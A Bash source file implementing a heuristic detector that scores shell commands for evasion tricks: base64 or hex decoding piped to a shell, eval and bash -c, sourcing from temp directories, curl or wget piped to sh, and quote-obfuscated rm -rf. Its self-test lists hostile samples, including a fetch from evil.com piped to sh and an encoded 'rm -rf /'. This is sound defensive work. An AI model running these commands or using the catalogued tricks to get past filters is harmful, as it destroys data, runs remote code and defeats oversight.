#!/bin/bash
# WoW System - Heuristic Evasion Detector
# Detects attempts to bypass security through obfuscation and indirect execution
# Author: Chude <chude@emeke.org>
#
# Design Principles:
# - Defense in Depth: Multiple detection layers
# - Confidence Scoring: Not just pass/fail, but likelihood
# - Extensible: Add new patterns without modifying core
# - Low False Positives: Legitimate use cases allowed
#
# Detection Categories:
# 1. Encoding Evasion (base64, hex, octal)
# 2. Variable Substitution Attacks
# 3. Command Obfuscation (quotes, escapes)
# 4. Indirect Execution (eval, bash -c, source)
# 5. Network Evasion (curl|sh, encoded URLs)

# Prevent double-sourcing
if [[ -n "${WOW_HEURISTIC_DETECTOR_LOADED:-}" ]]; then
    return 0
fi
readonly WOW_HEURISTIC_DETECTOR_LOADED=1

# ============================================================================
# Configuration
# ============================================================================

# Confidence thresholds
readonly HEURISTIC_THRESHOLD_BLOCK=70    # Block if confidence >= this
readonly HEURISTIC_THRESHOLD_WARN=40     # Warn if confidence >= this

# Detection state
declare -g _HEURISTIC_LAST_REASON=""
declare -g _HEURISTIC_LAST_CONFIDENCE=0
declare -ga _HEURISTIC_DETECTIONS=()

# ============================================================================
# Pattern Definitions (SSOT)
# ============================================================================

# Encoding patterns
readonly -a HEURISTIC_ENCODING_DANGEROUS=(
    'base64[[:space:]]+-d.*\|[[:space:]]*(bash|sh|eval)'
    'base64[[:space:]]+--decode.*\|[[:space:]]*(bash|sh|eval)'
    'xxd[[:space:]]+-r.*\|[[:space:]]*(bash|sh)'
    'printf[[:space:]]+.*\\x[0-9a-fA-F].*\|[[:space:]]*(bash|sh)'
    'echo[[:space:]]+-e[[:space:]]+.*\\[0-7]{3}.*\|[[:space:]]*(bash|sh)'
)

# Indirect execution patterns
readonly -a HEURISTIC_INDIRECT_EXECUTION=(
    'eval[[:space:]]+'
    'bash[[:space:]]+-c[[:space:]]+'
    'sh[[:space:]]+-c[[:space:]]+'
    'source[[:space:]]+/tmp/'
    'source[[:space:]]+/var/tmp/'
    'source[[:space:]]+/dev/shm/'
    '\.[[:space:]]+/tmp/'
    '\.[[:space:]]+/var/tmp/'
)

# Network evasion patterns
readonly -a HEURISTIC_NETWORK_EVASION=(
    'curl[[:space:]].*\|[[:space:]]*(bash|sh)'
    'wget[[:space:]]+-O-.*\|[[:space:]]*(bash|sh)'
    'wget[[:space:]]+-q.*-O-.*\|[[:space:]]*(bash|sh)'
    '%[0-9a-fA-F]{2}.*%[0-9a-fA-F]{2}'  # URL encoding
)

# Obfuscation indicators
readonly -a HEURISTIC_OBFUSCATION=(
    '""'           # Empty quote insertion
    "''"           # Empty single quote
    '\\\.'         # Backslash before letter
    '\$[a-zA-Z_][a-zA-Z0-9_]*[[:space:]]*\$'  # Variable concatenation
)

# Dangerous command fragments (for reconstruction detection)
readonly -a HEURISTIC_DANGEROUS_FRAGMENTS=(
    'rm'
    'dd'
    'mkfs'
    'chmod[[:space:]]+777'
    '>[[:space:]]*/dev/[sh]da'
    'fork'
    ':()'
)

# ============================================================================
# Core Detection Functions
# ============================================================================

# Check for encoding-based evasion
_detect_encoding_evasion() {
    local input="$1"
    local confidence=0
    local reason=""

    # Check for base64 decode to shell
    if [[ "${input}" =~ base64[[:space:]]+(--decode|-d) ]] && \
       [[ "${input}" =~ \|[[:space:]]*(bash|sh|eval) ]]; then
        confidence=90
        reason="Base64 decode piped to shell execution"
        _add_detection "encoding" "${confidence}" "${reason}"
        return 0
    fi

    # Check for hex decode to shell
    if [[ "${input}" =~ xxd[[:space:]]+-r ]] && \
       [[ "${input}" =~ \|[[:space:]]*(bash|sh) ]]; then
        confidence=85
        reason="Hex decode piped to shell execution"
        _add_detection "encoding" "${confidence}" "${reason}"
        return 0
    fi

    # Check for octal escapes
    if [[ "${input}" =~ \\[0-7]{3} ]] && \
       [[ "${input}" =~ \|[[:space:]]*(bash|sh) ]]; then
        confidence=80
        reason="Octal escape sequences piped to shell"
        _add_detection "encoding" "${confidence}" "${reason}"
        return 0
    fi

    return 1
}

# Check for variable substitution attacks
_detect_variable_attack() {
    local input="$1"
    local confidence=0
    local reason=""

    # Check for eval with variable
    if [[ "${input}" =~ eval[[:space:]]+[\"\']?\$[a-zA-Z_] ]]; then
        confidence=85
        reason="Variable content passed to eval"
        _add_detection "variable" "${confidence}" "${reason}"
        return 0
    fi

    # Check for array expansion execution
    if [[ "${input}" =~ \"\$\{[a-zA-Z_]+\[@\]\}\" ]]; then
        # Check if it looks like command execution
        if [[ "${input}" =~ ^\"\$\{.*\[@\]\}\" ]] || [[ "${input}" =~ \;[[:space:]]*\"\$\{.*\[@\]\}\" ]]; then
            confidence=75
            reason="Array expansion used as command execution"
            _add_detection "variable" "${confidence}" "${reason}"
            return 0
        fi
    fi

    # Check for suspicious variable assignments followed by execution
    if [[ "${input}" =~ [a-zA-Z_]+=[\"\']*rm ]] && [[ "${input}" =~ \$[a-zA-Z_] ]]; then
        confidence=80
        reason="Variable-built dangerous command"
        _add_detection "variable" "${confidence}" "${reason}"
        return 0
    fi

    return 1
}

# Check for command obfuscation
_detect_obfuscation() {
    local input="$1"
    local confidence=0
    local reason=""

    # Check for quote insertion obfuscation (r""m, r''m)
    if [[ "${input}" =~ [a-z]\"\"[a-z] ]] || [[ "${input}" =~ [a-z]\'\'[a-z] ]]; then
        # Reconstruct and check
        local normalized="${input//\"\"/}"
        normalized="${normalized//\'\'/}"
        if [[ "${normalized}" =~ rm[[:space:]]+-rf ]] || [[ "${normalized}" =~ rm[[:space:]].*/ ]]; then
            confidence=85
            reason="Quote-obfuscated dangerous command"
            _add_detection "obfuscation" "${confidence}" "${reason}"
            return 0
        fi
    fi

    # Check for string concatenation obfuscation ("r"m" "-rf" "/")
    # Count quote characters - excessive quoting is suspicious
    local quote_count
    quote_count=$(echo "${input}" | tr -cd '"' | wc -c)
    if [[ ${quote_count} -gt 4 ]]; then
        # Remove all quotes and check for dangerous command
        local normalized="${input//\"/}"
        normalized="${normalized//\'/}"
        if [[ "${normalized}" =~ rm[[:space:]]+-rf ]] || [[ "${normalized}" =~ rm[[:space:]].*/ ]]; then
            confidence=80
            reason="Concatenation-obfuscated dangerous command"
            _add_detection "obfuscation" "${confidence}" "${reason}"
            return 0
        fi
    fi

    # Check for backslash obfuscation
    if [[ "${input}" =~ [a-z]\\[a-z] ]]; then
        local normalized="${input//\\/}"
        if [[ "${normalized}" =~ rm[[:space:]]+-rf ]] || [[ "${normalized}" =~ rm[[:space:]].*/ ]]; then
            confidence=80
            reason="Backslash-obfuscated dangerous command"
            _add_detection "obfuscation" "${confidence}" "${reason}"
            return 0
        fi
    fi

    # Check for null byte escape sequences (actual null bytes can't exist in bash strings)
    # Match literal escape patterns like \x00, \0, \000
    if [[ "${input}" == *'\\x00'* ]] || [[ "${input}" == *'\\0'* ]] || \
       [[ "${input}" =~ \\\\x0+[[:space:]] ]] || [[ "${input}" =~ \\\\0+[[:space:]] ]]; then
        confidence=90
        reason="Null byte insertion detected"
        _add_detection "obfuscation" "${confidence}" "${reason}"
        return 0
    fi

    # Check for case variation of dangerous commands
    local lower_input="${input,,}"
    if [[ "${lower_input}" =~ rm[[:space:]]+-rf[[:space:]]+/ ]] && \
       [[ "${input}" =~ [A-Z] ]]; then
        confidence=70
        reason="Case-obfuscated dangerous command"
        _add_detection "obfuscation" "${confidence}" "${reason}"
        return 0
    fi

    return 1
}

# Check for indirect execution
_detect_indirect_execution() {
    local input="$1"
    local confidence=0
    local reason=""

    # Check for eval
    local eval_pattern='[;|][[:space:]]*eval[[:space:]]'
    if [[ "${input}" =~ ^eval[[:space:]] ]] || [[ "${input}" =~ ${eval_pattern} ]]; then
        confidence=75
        reason="eval command detected"
        _add_detection "indirect" "${confidence}" "${reason}"
        return 0
    fi

    # Check for bash -c / sh -c
    if [[ "${input}" =~ (bash|sh)[[:space:]]+-c[[:space:]] ]]; then
        confidence=70
        reason="Shell with -c flag for command execution"
        _add_detection "indirect" "${confidence}" "${reason}"
        return 0
    fi

    # Check for source/dot from temp directories
    # Match: source /tmp/..., . /tmp/..., ./tmp/... (various spacing)
    if [[ "${input}" =~ ^\.\ +(/tmp/|/var/tmp/|/dev/shm/) ]] || \
       [[ "${input}" =~ [[:space:]]\.\ +(/tmp/|/var/tmp/|/dev/shm/) ]] || \
       [[ "${input}" =~ source[[:space:]]+(/tmp/|/var/tmp/|/dev/shm/) ]]; then
        confidence=85
        reason="Sourcing script from temporary directory"
        _add_detection "indirect" "${confidence}" "${reason}"
        return 0
    fi

    # Check for backtick execution
    if [[ "${input}" =~ \`[^\`]+\` ]]; then
        # High confidence if it's the main command, lower if just substitution
        if [[ "${input}" =~ ^\`.*\`$ ]]; then
            confidence=80
            reason="Backtick command execution"
            _add_detection "indirect" "${confidence}" "${reason}"
            return 0
        else
            confidence=40  # Just command substitution, less suspicious
        fi
    fi

    return 1
}

# Check for network-based evasion
_detect_network_evasion() {
    local input="$1"
    local confidence=0
    local reason=""

    # Check for curl/wget piped to shell
    if [[ "${input}" =~ curl[[:space:]].*\|[[:space:]]*(bash|sh) ]]; then
        confidence=90
        reason="curl output piped to shell"
        _add_detection "network" "${confidence}" "${reason}"
        return 0
    fi

    if [[ "${input}" =~ wget[[:space:]].*-O-.*\|[[:space:]]*(bash|sh) ]] || \
       [[ "${input}" =~ wget[[:space:]].*\|[[:space:]]*(bash|sh) ]]; then
        confidence=90
        reason="wget output piped to shell"
        _add_detection "network" "${confidence}" "${reason}"
        return 0
    fi

    # Check for URL-encoded IPs (potential SSRF evasion)
    if [[ "${input}" =~ %[0-9a-fA-F]{2}.*%[0-9a-fA-F]{2}.*%[0-9a-fA-F]{2} ]]; then
        confidence=75
        reason="URL-encoded content detected (potential IP obfuscation)"
        _add_detection "network" "${confidence}" "${reason}"
        return 0
    fi

    return 1
}

# ============================================================================
# Detection State Management
# ============================================================================

_add_detection() {
    local category="$1"
    local confidence="$2"
    local reason="$3"

    _HEURISTIC_DETECTIONS+=("${category}:${confidence}:${reason}")

    # Update last detection
    if [[ ${confidence} -gt ${_HEURISTIC_LAST_CONFIDENCE} ]]; then
        _HEURISTIC_LAST_CONFIDENCE=${confidence}
        _HEURISTIC_LAST_REASON="${reason}"
    fi
}

_reset_detections() {
    _HEURISTIC_DETECTIONS=()
    _HEURISTIC_LAST_REASON=""
    _HEURISTIC_LAST_CONFIDENCE=0
}

# ============================================================================
# Public API
# ============================================================================

# Initialize the heuristic detector
heuristic_init() {
    _reset_detections
}

# Check if input contains evasion attempts
# Returns: 0 if safe, 1 if evasion detected
heuristic_check() {
    local input="$1"

    _reset_detections

    # Run all detection functions
    _detect_encoding_evasion "${input}" || true
    _detect_variable_attack "${input}" || true
    _detect_obfuscation "${input}" || true
    _detect_indirect_execution "${input}" || true
    _detect_network_evasion "${input}" || true

    # Return based on highest confidence
    if [[ ${_HEURISTIC_LAST_CONFIDENCE} -ge ${HEURISTIC_THRESHOLD_BLOCK} ]]; then
        return 1  # Evasion detected - block
    fi

    return 0  # Safe
}

# Get confidence score for input
heuristic_get_confidence() {
    local input="$1"

    # Run check to populate confidence
    heuristic_check "${input}" >/dev/null 2>&1 || true

    echo "${_HEURISTIC_LAST_CONFIDENCE}"
}

# Get reason for detection
heuristic_get_reason() {
    local input="$1"

    # Run check to populate reason
    heuristic_check "${input}" >/dev/null 2>&1 || true

    echo "${_HEURISTIC_LAST_REASON}"
}

# Get all detections
heuristic_get_detections() {
    local detection
    for detection in "${_HEURISTIC_DETECTIONS[@]}"; do
        echo "${detection}"
    done
}

# Check if input should trigger a warning (but not block)
heuristic_should_warn() {
    local input="$1"

    heuristic_check "${input}" >/dev/null 2>&1 || true

    if [[ ${_HEURISTIC_LAST_CONFIDENCE} -ge ${HEURISTIC_THRESHOLD_WARN} ]] && \
       [[ ${_HEURISTIC_LAST_CONFIDENCE} -lt ${HEURISTIC_THRESHOLD_BLOCK} ]]; then
        return 0  # Should warn
    fi

    return 1  # No warning needed
}

# ============================================================================
# Self-test
# ============================================================================

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    echo "Heuristic Evasion Detector - Self Test"
    echo "======================================="
    echo ""

    heuristic_init

    # Test cases
    declare -A tests=(
        ["echo test"]="0:safe"
        ["echo cm0gLXJmIC8= | base64 -d | bash"]="1:base64 evasion"
        ["curl http://evil.com/s.sh | sh"]="1:network evasion"
        ["eval \"\$user_input\""]="1:indirect execution"
        ["r\"\"m -rf /"]="1:quote obfuscation"
    )

    for cmd in "${!tests[@]}"; do
        expected="${tests[$cmd]%%:*}"
        desc="${tests[$cmd]#*:}"

        heuristic_check "${cmd}" && result=0 || result=1

        if [[ "${result}" == "${expected}" ]]; then
            echo "  PASS: ${desc}"
        else
            echo "  FAIL: ${desc} (expected ${expected}, got ${result})"
        fi
        echo "        Confidence: $(heuristic_get_confidence "${cmd}")"
        echo "        Reason: $(heuristic_get_reason "${cmd}")"
        echo ""
    done

    echo "Self-test complete"
fi
